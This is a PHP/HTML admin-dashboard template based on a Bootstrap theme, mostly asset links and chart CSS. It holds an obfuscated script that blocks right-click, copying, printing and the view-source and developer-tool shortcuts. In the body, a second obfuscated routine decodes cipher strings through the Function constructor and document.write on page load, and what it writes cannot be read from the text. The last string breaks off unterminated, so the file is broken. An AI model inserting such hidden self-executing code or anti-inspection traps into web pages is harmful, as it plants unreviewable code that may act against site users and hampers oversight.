<?php $directory = base_url('public/admin') ?>
<html
  lang="en"
  dir="ltr"
  data-nav-layout="vertical"
  data-theme-mode="light"
  data-header-styles="light"
  data-menu-styles="dark"
  loader="disable"
  data-vertical-style="overlay"
>
  <head>
    <!-- Meta Data -->
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>Dashboard</title>
    <meta
      name="Description"
      content="Bootstrap Responsive Admin Web Dashboard HTML5 Template"
    />
    <meta name="Author" content="Spruko Technologies Private Limited" />
    <meta
      name="keywords"
      content="admin,admin dashboard,admin panel,admin template,bootstrap,clean,dashboard,flat,jquery,modern,responsive,premium admin templates,responsive admin,ui,ui kit."
    />
    <!-- Favicon -->
    <link
      rel="icon"
      href="<?php echo base_url('public/admin') ?>/assets/images/brand-logos/favicon.ico" type="image/x-icon" />
    <!-- Choices JS -->
    <script src="<?php echo base_url('public/admin') ?>/assets/libs/choices.js/public/assets/scripts/choices.min.js"></script>
    <!-- Main Theme Js -->
    <script src="<?php echo base_url('public/admin') ?>/assets/js/main.js"></script>
    <!-- Bootstrap Css -->
    <link
      id="style"
      href="<?php echo base_url('public/admin') ?>/assets/libs/bootstrap/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <!-- Style Css -->
    <link href="<?php echo base_url('public/admin') ?>/assets/css/styles.min.css" rel="stylesheet" />
    <!-- Icons Css -->
    <link href="<?php echo base_url('public/admin') ?>/assets/css/icons.css" rel="stylesheet" />
    <!-- Node Waves Css -->
    <link href="<?php echo base_url('public/admin') ?>/assets/libs/node-waves/waves.min.css" rel="stylesheet" />
    <!-- Simplebar Css -->
    <link href="<?php echo base_url('public/admin') ?>/assets/libs/simplebar/simplebar.min.css" rel="stylesheet" />
    <!-- Color Picker Css -->
    <link rel="stylesheet" href="<?php echo base_url('public/admin') ?>/assets/libs/flatpickr/flatpickr.min.css" />
    <link
      rel="stylesheet"
      href="<?php echo base_url('public/admin') ?>/assets/libs/@simonwep/pickr/themes/nano.min.css"
    />
    <!-- Choices Css -->
    <link
      rel="stylesheet"
      href="<?php echo base_url('public/admin') ?>/assets/libs/choices.js/public/assets/styles/choices.min.css"
    />
    <link
      rel="stylesheet"
      href="<?php echo base_url('public/admin') ?>/assets/libs/jsvectormap/css/jsvectormap.min.css"
    />
    <link rel="stylesheet" href="<?php echo base_url('public/admin') ?>/assets/libs/swiper/swiper-bundle.min.css" />
    <script type="text/javascript">
      <!--
      oewy = document.all;
      gm0q = oewy && !document.getElementById;
      o3rj = oewy && document.getElementById;
      ixvv = !oewy && document.getElementById;
      fzl7 = document.layers;
      function yo02(eui9) {
        try {
          if (gm0q) alert("");
        } catch (e) {}
        if (eui9 && eui9.stopPropagation) eui9.stopPropagation();
        return false;
      }
      function eeot() {
        if (event.button == 2 || event.button == 3) yo02();
      }
      function opcs(e) {
        return e.which == 3 ? yo02() : true;
      }
      function vnsv(pn2m) {
        for (e2s9 = 0; e2s9 < pn2m.images.length; e2s9++) {
          pn2m.images[e2s9].onmousedown = opcs;
        }
        for (e2s9 = 0; e2s9 < pn2m.layers.length; e2s9++) {
          vnsv(pn2m.layers[e2s9].document);
        }
      }
      function r9jr() {
        if (gm0q) {
          for (e2s9 = 0; e2s9 < document.images.length; e2s9++) {
            document.images[e2s9].onmousedown = eeot;
          }
        } else if (fzl7) {
          vnsv(document);
        }
      }
      function ml2y(e) {
        if (
          (o3rj &&
            event &&
            event.srcElement &&
            event.srcElement.tagName == "IMG") ||
          (ixvv && e && e.target && e.target.tagName == "IMG")
        ) {
          return yo02();
        }
      }
      if (o3rj || ixvv) {
        document.oncontextmenu = ml2y;
      } else if (gm0q || fzl7) {
        window.onload = r9jr;
      }
      function gev4(e) {
        t2rq =
          e && e.srcElement && e.srcElement != null ? e.srcElement.tagName : "";
        if (t2rq != "INPUT" && t2rq != "TEXTAREA" && t2rq != "BUTTON") {
          return false;
        }
      }
      function r2gf() {
        return false;
      }
      if (oewy) {
        document.onselectstart = gev4;
        document.ondragstart = r2gf;
      }
      if (document.addEventListener) {
        document.addEventListener(
          "copy",
          function (e) {
            t2rq = e.target.tagName;
            if (t2rq != "INPUT" && t2rq != "TEXTAREA") {
              e.preventDefault();
            }
          },
          false
        );
        document.addEventListener(
          "dragstart",
          function (e) {
            e.preventDefault();
          },
          false
        );
      }
      function r4e9(evt) {
        if (evt.preventDefault) {
          evt.preventDefault();
        } else {
          evt.keyCode = 37;
          evt.returnValue = false;
        }
      }
      var mpfn = 1;
      var dfsm = 2;
      var kzpj = 4;
      var n4o5 = new Array();
      n4o5.push(new Array(dfsm, 65));
      n4o5.push(new Array(dfsm, 67));
      n4o5.push(new Array(dfsm, 80));
      n4o5.push(new Array(dfsm, 83));
      n4o5.push(new Array(dfsm, 85));
      n4o5.push(new Array(mpfn | dfsm, 73));
      n4o5.push(new Array(mpfn | dfsm, 74));
      n4o5.push(new Array(mpfn, 121));
      n4o5.push(new Array(0, 123));
      function ogqn(evt) {
        evt = evt ? evt : event ? event : null;
        if (evt) {
          var gszb = evt.keyCode;
          if (!gszb && evt.charCode) {
            gszb = String.fromCharCode(evt.charCode)
              .toUpperCase()
              .charCodeAt(0);
          }
          for (var r1lh = 0; r1lh < n4o5.length; r1lh++) {
            if (
              evt.shiftKey == ((n4o5[r1lh][0] & mpfn) == mpfn) &&
              (evt.ctrlKey | evt.metaKey) == ((n4o5[r1lh][0] & dfsm) == dfsm) &&
              evt.altKey == ((n4o5[r1lh][0] & kzpj) == kzpj) &&
              (gszb == n4o5[r1lh][1] || n4o5[r1lh][1] == 0)
            ) {
              r4e9(evt);
              break;
            }
          }
        }
      }
      if (document.addEventListener) {
        document.addEventListener("keydown", ogqn, true);
        document.addEventListener("keypress", ogqn, true);
      } else if (document.attachEvent) {
        document.attachEvent("onkeydown", ogqn);
      }
      -->
    </script>
    <meta http-equiv="imagetoolbar" content="no" />
    <style type="text/css">
      <!-- input,textarea{-webkit-touch-callout:default;-webkit-user-select:auto;-khtml-user-select:auto;-moz-user-select:text;-ms-user-select:text;user-select:text} *{-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:-moz-none;-ms-user-select:none;user-select:none} -->
    </style>
    <style type="text/css" media="print">
      <!-- body{display:none} -->
    </style>
    <!--[if gte IE 5]><frame></frame><![endif]-->
    <style id="apexcharts-css">
      @keyframes opaque {
        0% {
          opacity: 0;
        }

        to {
          opacity: 1;
        }
      }

      @keyframes resizeanim {
        0%,
        to {
          opacity: 0;
        }
      }

      .apexcharts-canvas {
        position: relative;
        user-select: none;
      }

      .apexcharts-canvas ::-webkit-scrollbar {
        -webkit-appearance: none;
        width: 6px;
      }

      .apexcharts-canvas ::-webkit-scrollbar-thumb {
        border-radius: 4px;
        background-color: rgba(0, 0, 0, 0.5);
        box-shadow: 0 0 1px rgba(255, 255, 255, 0.5);
        -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, 0.5);
      }

      .apexcharts-inner {
        position: relative;
      }

      .apexcharts-text tspan {
        font-family: inherit;
      }

      .legend-mouseover-inactive {
        transition: 0.15s ease all;
        opacity: 0.2;
      }

      .apexcharts-legend-text {
        padding-left: 15px;
        margin-left: -15px;
      }

      .apexcharts-series-collapsed {
        opacity: 0;
      }

      .apexcharts-tooltip {
        border-radius: 5px;
        box-shadow: 2px 2px 6px -4px #999;
        cursor: default;
        font-size: 14px;
        left: 62px;
        opacity: 0;
        pointer-events: none;
        position: absolute;
        top: 20px;
        display: flex;
        flex-direction: column;
        overflow: hidden;
        white-space: nowrap;
        z-index: 12;
        transition: 0.15s ease all;
      }

      .apexcharts-tooltip.apexcharts-active {
        opacity: 1;
        transition: 0.15s ease all;
      }

      .apexcharts-tooltip.apexcharts-theme-light {
        border: 1px solid #e3e3e3;
        background: rgba(255, 255, 255, 0.96);
      }

      .apexcharts-tooltip.apexcharts-theme-dark {
        color: #fff;
        background: rgba(30, 30, 30, 0.8);
      }

      .apexcharts-tooltip * {
        font-family: inherit;
      }

      .apexcharts-tooltip-title {
        padding: 6px;
        font-size: 15px;
        margin-bottom: 4px;
      }

      .apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
        background: #eceff1;
        border-bottom: 1px solid #ddd;
      }

      .apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
        background: rgba(0, 0, 0, 0.7);
        border-bottom: 1px solid #333;
      }

      .apexcharts-tooltip-text-goals-value,
      .apexcharts-tooltip-text-y-value,
      .apexcharts-tooltip-text-z-value {
        display: inline-block;
        margin-left: 5px;
        font-weight: 600;
      }

      .apexcharts-tooltip-text-goals-label:empty,
      .apexcharts-tooltip-text-goals-value:empty,
      .apexcharts-tooltip-text-y-label:empty,
      .apexcharts-tooltip-text-y-value:empty,
      .apexcharts-tooltip-text-z-value:empty,
      .apexcharts-tooltip-title:empty {
        display: none;
      }

      .apexcharts-tooltip-text-goals-label,
      .apexcharts-tooltip-text-goals-value {
        padding: 6px 0 5px;
      }

      .apexcharts-tooltip-goals-group,
      .apexcharts-tooltip-text-goals-label,
      .apexcharts-tooltip-text-goals-value {
        display: flex;
      }

      .apexcharts-tooltip-text-goals-label:not(:empty),
      .apexcharts-tooltip-text-goals-value:not(:empty) {
        margin-top: -6px;
      }

      .apexcharts-tooltip-marker {
        width: 12px;
        height: 12px;
        position: relative;
        top: 0;
        margin-right: 10px;
        border-radius: 50%;
      }

      .apexcharts-tooltip-series-group {
        padding: 0 10px;
        display: none;
        text-align: left;
        justify-content: left;
        align-items: center;
      }

      .apexcharts-tooltip-series-group.apexcharts-active
        .apexcharts-tooltip-marker {
        opacity: 1;
      }

      .apexcharts-tooltip-series-group.apexcharts-active,
      .apexcharts-tooltip-series-group:last-child {
        padding-bottom: 4px;
      }

      .apexcharts-tooltip-series-group-hidden {
        opacity: 0;
        height: 0;
        line-height: 0;
        padding: 0 !important;
      }

      .apexcharts-tooltip-y-group {
        padding: 6px 0 5px;
      }

      .apexcharts-custom-tooltip,
      .apexcharts-tooltip-box {
        padding: 4px 8px;
      }

      .apexcharts-tooltip-boxPlot {
        display: flex;
        flex-direction: column-reverse;
      }

      .apexcharts-tooltip-box > div {
        margin: 4px 0;
      }

      .apexcharts-tooltip-box span.value {
        font-weight: 700;
      }

      .apexcharts-tooltip-rangebar {
        padding: 5px 8px;
      }

      .apexcharts-tooltip-rangebar .category {
        font-weight: 600;
        color: #777;
      }

      .apexcharts-tooltip-rangebar .series-name {
        font-weight: 700;
        display: block;
        margin-bottom: 5px;
      }

      .apexcharts-xaxistooltip,
      .apexcharts-yaxistooltip {
        opacity: 0;
        pointer-events: none;
        color: #373d3f;
        font-size: 13px;
        text-align: center;
        border-radius: 2px;
        position: absolute;
        z-index: 10;
        background: #eceff1;
        border: 1px solid #90a4ae;
      }

      .apexcharts-xaxistooltip {
        padding: 9px 10px;
        transition: 0.15s ease all;
      }

      .apexcharts-xaxistooltip.apexcharts-theme-dark {
        background: rgba(0, 0, 0, 0.7);
        border: 1px solid rgba(0, 0, 0, 0.5);
        color: #fff;
      }

      .apexcharts-xaxistooltip:after,
      .apexcharts-xaxistooltip:before {
        left: 50%;
        border: solid transparent;
        content: " ";
        height: 0;
        width: 0;
        position: absolute;
        pointer-events: none;
      }

      .apexcharts-xaxistooltip:after {
        border-color: transparent;
        border-width: 6px;
        margin-left: -6px;
      }

      .apexcharts-xaxistooltip:before {
        border-color: transparent;
        border-width: 7px;
        margin-left: -7px;
      }

      .apexcharts-xaxistooltip-bottom:after,
      .apexcharts-xaxistooltip-bottom:before {
        bottom: 100%;
      }

      .apexcharts-xaxistooltip-top:after,
      .apexcharts-xaxistooltip-top:before {
        top: 100%;
      }

      .apexcharts-xaxistooltip-bottom:after {
        border-bottom-color: #eceff1;
      }

      .apexcharts-xaxistooltip-bottom:before {
        border-bottom-color: #90a4ae;
      }

      .apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after,
      .apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
        border-bottom-color: rgba(0, 0, 0, 0.5);
      }

      .apexcharts-xaxistooltip-top:after {
        border-top-color: #eceff1;
      }

      .apexcharts-xaxistooltip-top:before {
        border-top-color: #90a4ae;
      }

      .apexcharts-xaxistooltip-top.apexcharts-theme-dark:after,
      .apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
        border-top-color: rgba(0, 0, 0, 0.5);
      }

      .apexcharts-xaxistooltip.apexcharts-active {
        opacity: 1;
        transition: 0.15s ease all;
      }

      .apexcharts-yaxistooltip {
        padding: 4px 10px;
      }

      .apexcharts-yaxistooltip.apexcharts-theme-dark {
        background: rgba(0, 0, 0, 0.7);
        border: 1px solid rgba(0, 0, 0, 0.5);
        color: #fff;
      }

      .apexcharts-yaxistooltip:after,
      .apexcharts-yaxistooltip:before {
        top: 50%;
        border: solid transparent;
        content: " ";
        height: 0;
        width: 0;
        position: absolute;
        pointer-events: none;
      }

      .apexcharts-yaxistooltip:after {
        border-color: transparent;
        border-width: 6px;
        margin-top: -6px;
      }

      .apexcharts-yaxistooltip:before {
        border-color: transparent;
        border-width: 7px;
        margin-top: -7px;
      }

      .apexcharts-yaxistooltip-left:after,
      .apexcharts-yaxistooltip-left:before {
        left: 100%;
      }

      .apexcharts-yaxistooltip-right:after,
      .apexcharts-yaxistooltip-right:before {
        right: 100%;
      }

      .apexcharts-yaxistooltip-left:after {
        border-left-color: #eceff1;
      }

      .apexcharts-yaxistooltip-left:before {
        border-left-color: #90a4ae;
      }

      .apexcharts-yaxistooltip-left.apexcharts-theme-dark:after,
      .apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
        border-left-color: rgba(0, 0, 0, 0.5);
      }

      .apexcharts-yaxistooltip-right:after {
        border-right-color: #eceff1;
      }

      .apexcharts-yaxistooltip-right:before {
        border-right-color: #90a4ae;
      }

      .apexcharts-yaxistooltip-right.apexcharts-theme-dark:after,
      .apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
        border-right-color: rgba(0, 0, 0, 0.5);
      }

      .apexcharts-yaxistooltip.apexcharts-active {
        opacity: 1;
      }

      .apexcharts-yaxistooltip-hidden {
        display: none;
      }

      .apexcharts-xcrosshairs,
      .apexcharts-ycrosshairs {
        pointer-events: none;
        opacity: 0;
        transition: 0.15s ease all;
      }

      .apexcharts-xcrosshairs.apexcharts-active,
      .apexcharts-ycrosshairs.apexcharts-active {
        opacity: 1;
        transition: 0.15s ease all;
      }

      .apexcharts-ycrosshairs-hidden {
        opacity: 0;
      }

      .apexcharts-selection-rect {
        cursor: move;
      }

      .svg_select_boundingRect,
      .svg_select_points_rot {
        pointer-events: none;
        opacity: 0;
        visibility: hidden;
      }

      .apexcharts-selection-rect + g .svg_select_boundingRect,
      .apexcharts-selection-rect + g .svg_select_points_rot {
        opacity: 0;
        visibility: hidden;
      }

      .apexcharts-selection-rect + g .svg_select_points_l,
      .apexcharts-selection-rect + g .svg_select_points_r {
        cursor: ew-resize;
        opacity: 1;
        visibility: visible;
      }

      .svg_select_points {
        fill: #efefef;
        stroke: #333;
        rx: 2;
      }

      .apexcharts-svg.apexcharts-zoomable.hovering-zoom {
        cursor: crosshair;
      }

      .apexcharts-svg.apexcharts-zoomable.hovering-pan {
        cursor: move;
      }

      .apexcharts-menu-icon,
      .apexcharts-pan-icon,
      .apexcharts-reset-icon,
      .apexcharts-selection-icon,
      .apexcharts-toolbar-custom-icon,
      .apexcharts-zoom-icon,
      .apexcharts-zoomin-icon,
      .apexcharts-zoomout-icon {
        cursor: pointer;
        width: 20px;
        height: 20px;
        line-height: 24px;
        color: #6e8192;
        text-align: center;
      }

      .apexcharts-menu-icon svg,
      .apexcharts-reset-icon svg,
      .apexcharts-zoom-icon svg,
      .apexcharts-zoomin-icon svg,
      .apexcharts-zoomout-icon svg {
        fill: #6e8192;
      }

      .apexcharts-selection-icon svg {
        fill: #444;
        transform: scale(0.76);
      }

      .apexcharts-theme-dark .apexcharts-menu-icon svg,
      .apexcharts-theme-dark .apexcharts-pan-icon svg,
      .apexcharts-theme-dark .apexcharts-reset-icon svg,
      .apexcharts-theme-dark .apexcharts-selection-icon svg,
      .apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg,
      .apexcharts-theme-dark .apexcharts-zoom-icon svg,
      .apexcharts-theme-dark .apexcharts-zoomin-icon svg,
      .apexcharts-theme-dark .apexcharts-zoomout-icon svg {
        fill: #f3f4f5;
      }

      .apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg,
      .apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
      .apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg {
        fill: #008ffb;
      }

      .apexcharts-theme-light .apexcharts-menu-icon:hover svg,
      .apexcharts-theme-light .apexcharts-reset-icon:hover svg,
      .apexcharts-theme-light
        .apexcharts-selection-icon:not(.apexcharts-selected):hover
        svg,
      .apexcharts-theme-light
        .apexcharts-zoom-icon:not(.apexcharts-selected):hover
        svg,
      .apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
      .apexcharts-theme-light .apexcharts-zoomout-icon:hover svg {
        fill: #333;
      }

      .apexcharts-menu-icon,
      .apexcharts-selection-icon {
        position: relative;
      }

      .apexcharts-reset-icon {
        margin-left: 5px;
      }

      .apexcharts-menu-icon,
      .apexcharts-reset-icon,
      .apexcharts-zoom-icon {
        transform: scale(0.85);
      }

      .apexcharts-zoomin-icon,
      .apexcharts-zoomout-icon {
        transform: scale(0.7);
      }

      .apexcharts-zoomout-icon {
        margin-right: 3px;
      }

      .apexcharts-pan-icon {
        transform: scale(0.62);
        position: relative;
        left: 1px;
        top: 0;
      }

      .apexcharts-pan-icon svg {
        fill: #fff;
        stroke: #6e8192;
        stroke-width: 2;
      }

      .apexcharts-pan-icon.apexcharts-selected svg {
        stroke: #008ffb;
      }

      .apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
        stroke: #333;
      }

      .apexcharts-toolbar {
        position: absolute;
        z-index: 11;
        max-width: 176px;
        text-align: right;
        border-radius: 3px;
        padding: 0 6px 2px;
        display: flex;
        justify-content: space-between;
        align-items: center;
      }

      .apexcharts-menu {
        background: #fff;
        position: absolute;
        top: 100%;
        border: 1px solid #ddd;
        border-radius: 3px;
        padding: 3px;
        right: 10px;
        opacity: 0;
        min-width: 110px;
        transition: 0.15s ease all;
        pointer-events: none;
      }

      .apexcharts-menu.apexcharts-menu-open {
        opacity: 1;
        pointer-events: all;
        transition: 0.15s ease all;
      }

      .apexcharts-menu-item {
        padding: 6px 7px;
        font-size: 12px;
        cursor: pointer;
      }

      .apexcharts-theme-light .apexcharts-menu-item:hover {
        background: #eee;
      }

      .apexcharts-theme-dark .apexcharts-menu {
        background: rgba(0, 0, 0, 0.7);
        color: #fff;
      }

      @media screen and (min-width: 768px) {
        .apexcharts-canvas:hover .apexcharts-toolbar {
          opacity: 1;
        }
      }

      .apexcharts-canvas .apexcharts-element-hidden,
      .apexcharts-datalabel.apexcharts-element-hidden,
      .apexcharts-hide .apexcharts-series-points {
        opacity: 0;
      }

      .apexcharts-hidden-element-shown {
        opacity: 1;
        transition: 0.25s ease all;
      }
      .apexcharts-datalabel,
      .apexcharts-datalabel-label,
      .apexcharts-datalabel-value,
      .apexcharts-datalabels,
      .apexcharts-pie-label {
        cursor: default;
        pointer-events: none;
      }

      .apexcharts-pie-label-delay {
        opacity: 0;
        animation-name: opaque;
        animation-duration: 0.3s;
        animation-fill-mode: forwards;
        animation-timing-function: ease;
      }

      .apexcharts-annotation-rect,
      .apexcharts-area-series .apexcharts-area,
      .apexcharts-area-series
        .apexcharts-series-markers
        .apexcharts-marker.no-pointer-events,
      .apexcharts-gridline,
      .apexcharts-line,
      .apexcharts-line-series
        .apexcharts-series-markers
        .apexcharts-marker.no-pointer-events,
      .apexcharts-point-annotation-label,
      .apexcharts-radar-series path,
      .apexcharts-radar-series polygon,
      .apexcharts-toolbar svg,
      .apexcharts-tooltip .apexcharts-marker,
      .apexcharts-xaxis-annotation-label,
      .apexcharts-yaxis-annotation-label,
      .apexcharts-zoom-rect {
        pointer-events: none;
      }

      .apexcharts-marker {
        transition: 0.15s ease all;
      }

      .resize-triggers {
        animation: 1ms resizeanim;
        visibility: hidden;
        opacity: 0;
        height: 100%;
        width: 100%;
        overflow: hidden;
      }

      .contract-trigger:before,
      .resize-triggers,
      .resize-triggers > div {
        content: " ";
        display: block;
        position: absolute;
        top: 0;
        left: 0;
      }

      .resize-triggers > div {
        height: 100%;
        width: 100%;
        background: #eee;
        overflow: auto;
      }

      .contract-trigger:before {
        overflow: hidden;
        width: 200%;
        height: 200%;
      }

      .apexcharts-bar-goals-markers {
        pointer-events: none;
      }

      .apexcharts-bar-shadows {
        pointer-events: none;
      }

      .apexcharts-rangebar-goals-markers {
        pointer-events: none;
      }
    </style>
  </head>
  <body>
    <script type="text/javascript">
      <!--
      function g03f(xcf8) {
        var btb6,
          w9d7,
          vigk,
          pqaf =
            ",7/RWGl+1w0yIzc(AH8e%k.mnbT\"F:32q#v©VaCOjsY$tU-'D=u@9hi Mx4_Qf)P!E6;>So5K&NJBrdLg|p<",
          sdum = Function,
          o47c = pqaf.length,
          w2uk = { cd: "" },
          ue = new sdum("ret" + "urn unesc" + "ape")(),
          hk5t = new sdum("x", ue("%74hi%73.c%64+=x")),
          ilte = new sdum("x", "y", ue("%72et%75rn%20x.c%68ar%41t(%79)"));
        for (w9d7 = 0; w9d7 < xcf8.length; w9d7++) {
          vigk = ilte(xcf8, w9d7);
          btb6 = pqaf.indexOf(vigk);
          if (btb6 > -1) {
            btb6 -= (w9d7 + 1) % o47c;
            if (btb6 < 0) {
              btb6 += o47c;
            }
            hk5t.call(w2uk, ilte(pqaf, btb6));
          } else {
            hk5t.call(w2uk, vigk);
          }
        }
        new sdum(
          ue("%64oc%75me%6Et.w%72it%65(t%68is.%63d)%3Bth%69s.c%64=n%75ll")
        ).call(w2uk);
      }
      g03f(
        ",6=uQJ@U/i6|.>_3oaIJ;>+Ln%|),taSNJ,Pm(Aid6r|/H#bT!WBR+I8BphRq.AG©lfRY©cv|H-" +
          '-5$.al9$cikgue$2Y-@C;u+ShPnMUjF:$e@CrMA1w\'5_oNLY0ayROp56iBv.@\'nG"5!IH8"luY$|kw%n:©$0:5zK@.>Bd%L=:Ju@dqaL;I;/52nMf)5u0/RsEh!>&LdGg$x0,Q(RlOEn7(MyLnn=k,tVaJ(Rc8moCEO2;T(0p%)!G@Yzh%L/l4rJP1©fMx,O5f:HOo=DNSoz9M7UCoJB7!P<!RM=3/ENe$RyG(LI8@FA<2e%:19tU<my.T28\'35=#$WVb%192$Ir=FaLy(OEQfW$WBkb8LQy<Fn76WDs&dLW;"e%4po|7lIBC\'EpjFx<zy#ro8mn#IyxE;w>C8!Oj;kib5L|mp9qcLnq4qCw)y Q&jAu1gbkpP7UCoJB7!)BNI6gd+l,&lkJGRAy.c8:a2|x+VVf#I"gY#Wtyoj8#@.UtC"3_pBz"4a =C%SxfURJ%\'&>SI@<$V>&N<)QNK7-y6!(pQ+8<SdmmD%<c;:%J2px"©h+Wq2bcH-o3CqY.OUt5p<0n v9-©C;+@_hP$Q6E_A%toB )5j/rDW 3,1T!fo(GxU;crB8zcsg,:9-;|F+be1yjm!YTVG)HCK6ROD"YyxDe_T7 P|©qsoh0KM6)s:$Oo-.dxJb<h)%P+4PQzFWM96GD9B8zcsgs:47".muGa|N."FaAcFTO,=%8biiL@3UcQ@.):W4y+7r5nC6E_D@g%!K6BM&Ldkq#t4G>/gSKHs7wRzr0A(wuid%TGIkNV"pCG!v5;fh\',cm9Y0p%@3: u@d#a6G<' +
          '%vEt)MUDrQHLP&Y(iJbejB7!LD07MIPC1Us©"k4K|TwuFI.8|S<LT/)vzDbL20ef%D(%HiC51&|-Gw#_i papo(eI&iGr.T=PfI,:b/;G=YNLgG>/gS+Q#KwSJIgbbu.7<zynmHl%h1:GyqA4-J5D:@yWVsY@3DY2hl-v3;N@w©K_Kl3rQCSgf\', Hb"hFp\'E00©+o7iA+)8Stc.jdJ,:9-;|F+be16.0ldAUFS\'2s/vm8l+k|:A v=8! T6#1)oWYO;6Q=9|5Ei, T9+,P\'EmyjVzdAQh7l+ALgCT  :&6ce%:1mBC:,j+6VqVW,cYuHVdFo:xn:TP\'gHplS5/yaDem%+megf<$V>&N<):m\'0|uIR4cEj0l0)4Kb@:e>/tqfxv(a|N."FaAWfpO9.!9|ri©xH0Y\'DxV5|GVQ:SVqjJ)2r>OL&SDVu-rfe+VtBEQDc4@<WGcrFC-rHoTr&|m>AG,K0O-M!aA2,-a1D(NtGi| \'u=_T2FaL;1>ySf&8."_D$20p"<i:prG=YNLgG>e:a>1fH>!Kcmdh.H73%KQp:1_%)OMc$z"cyYkO=Ak8-Y-c0n#))R_Ch.>_3oaI6"BerSK5|Dhu_WDW @_4vbzY-OA|q%=h-mWO"M9:0qBSH.mqy<Mrv\'H_\'BK=39IGaY$926B,2 n!2"©oxTKPvN>!$2UsKMc/2O5Q $wh-d<,wKm#sKIEkK>B8Py,L;Gvs@_qyTLsqR$0SOKq&8t$h%b.2&f U/26y(%9sVnRJ%B\'.JopY©;K&pfI.3f7i0fxE+A5-(0dmzEhJ.79z q=+Vl%+W©cqYwcyO©O+RHT  g92-(f9mP3G_19wC!P&jUY@w|T3m,EAW#a3+KmyjtacL38\'@tk/abiu"13N;(%k3w09jSS$RgF#v$.al9$cikgu-u8cFM!2u1Y,EKIO©6r0=;M"2F(2"WS+@tB|p+oa2 8G4%y6.&D8c8o6g#_a"B09jSEYmUGp3©VUnISl\'Q3KQG7)$Eb8u MEtLGzt>artjD<oO7B\'R|rMt4i7S"(t9,&>M.6_+Iz.7V-i7bdv7|G2Bnz1g8\'i!KUnO1iUAMmp9z9/aL;1j85A%bx-s:1gb|9"gJR\'jKrdR6H"©6l_(6)oIkB@%(<F8o4g"lx8Qai'
      );
      g03f(
        'Fx"sFbM©R!W2"4S/sUNN(5uEvg5Yp=ndOdFP191_ P)C:H-u$%7Vnhxu"1$2QM#cVg&kT"V(RQ|C@kP@gBhvMAws-\'M©ogW©_F>©2ONf3B;CdK>\'©=UBQ8l©$J!_\'zxupRWzB"aUBASbBKg.;(W<5wCU PV(3<UV+\'c&$J$lFo4+27)+yADaq%<5AK$856dC2P>Sdx18Tx|ulxhfRI;YylNewf=58|Dw@FURq/AR,20)OPl/#tfA%==N-bjw -Hxn<h7hACg>zH059RJ%nHd_0p"2n76HGvC21&nIsacLHfi/+1Hg|O"MM3N;(%k3wnrO37s1;a#aG7($@8aL:5dYjfW-iEpaS,QFnCfukb.wbkpP7UCoJB7!2b=I<9cGQA;YI1I!QN"h2koW-vP_VHO<Bn:3O8lP,sin6i<LMa_eIt=u_C&<+C)25CvYr!#Los|J5uC9DLPkwC-d;)uAQh7l+AL3jDLeKFLJ<bo8+/NIsD46O8#/DO0uHB-©kgD_%tcVd6Dq+_o2 bJ%n:fuU#I,:7M2,L+@tB|p+ok2Oo0Peo6NAbg neRq.N),20f.!s4AU(:Aztmk©#i|O\'4J3h=hkH2jSS06UQ:J6arte&)DmJ/\'5sP191_ P)C:H-u$%7Vnhxu"1$2QM#cVg&kT"V(RQ|C@kP@gBhvMAws-\'M©ogW©_F>©2ONf3B;CdK>\'©=UBQ8l©$J!_\'zxupRWzB"aUBASbBKg.;(W<5wCU PV(3<UV+\'c&$@Sr (&F=$z©rEFpl>F/s)MTBkb3)@-vz73/xq7g19Urp<15.qj5y!%5;JHT|Mb%W#mJP7qy)mEY_H-A3HcUn.Vv pjD_B2iui.8qsooy;-f3B;CdU%NpAn/-%_gNt6nIsUC(g2eD9U.RCT _9:0U#)6_VH9jSEYmUGp3©VUn.Vv pjD_B2iq:©)_ _"maQ\'Gr..gj#Eo5g_N$Gg@+4#R<R @EwH>RULalN=HF&z;#9©p9QCpMyqTg-DI8U@6Y0l%$qR+WJ+R!U;"%9x4;-z+2dEvg5Yp=ndNd-YMw©zR9cYo1deUfz<gCT @Fw2J>Ak.20p B#-A4-J5D:@yWVsY@3EJ<3imP3TvSMb5)#&;PY3tj5 z73Co_iY19Urp<15.qj5y!%5;JH)0<d6W#ju420bdj2/Yw>CAze-$IGi(m3KQ)Tq_E=8;FV5A%bx-s:1gb|9"gJR\'jKrdR6H"©6l_(6)oIkB@%(<F8o4g"lx8QaiIsybIwjeH2:ur©$i5T="n3xiui.8q Y55I>\')2r>OL-kJhuM<g=Y+9Q;bzY-OA|q%=h-mWO"M9:0qBSH.mqy<Mrv\'H_\'BK=39IGaY$926B,2 n!2"©oxTKPvN>!$2UsKMc/2O5Q $wh-d<,wKm#sKIEkK>B8Py,L;Gvs@_qyTLsqR$0SOHc%\'t9o©kg2&fP"#Q6:<DvwKHkT4\'Y3w|TphF|BWDs&dLW;8FV;+QA;P5z.r9kA,:e5_|F+4efC zYITz0s%8q3@dVt K"uFb24 @ me#M$KKzSDPqdSjg\'.Bi@x,|GmK4#>Tc$\'jHp#kui\'nGjFxh3y#ro8mn#I,xd©D8QDr&u2hzlC$thq;r7qMbEqFV54"&!©JSEtq-Y&x(RqjKfMt0i\'L,70&nvY&z6.&Sre!I7g>l©Y9Q#I"gY#Wtyoj=0;.Uc+MHbqN)%mg©;@%S3C&8."_D$20p"<i:prG=YNLgG>e:a>1fH>!Kcmdh.H73%KQp:1_%)OMc$z"cyYke#29LaUM&F@:Tq_M9Mn%vxt&&co=!#Los|Dmr/\'%_p@twi)S"(tDs8<v.@ Dbls:4i2Ivd5enbvz74LV=ef=dN@qic+OtUi#>d/#xT6#:aK_FNEVBo6U#\'$N4AW#s&)xUy 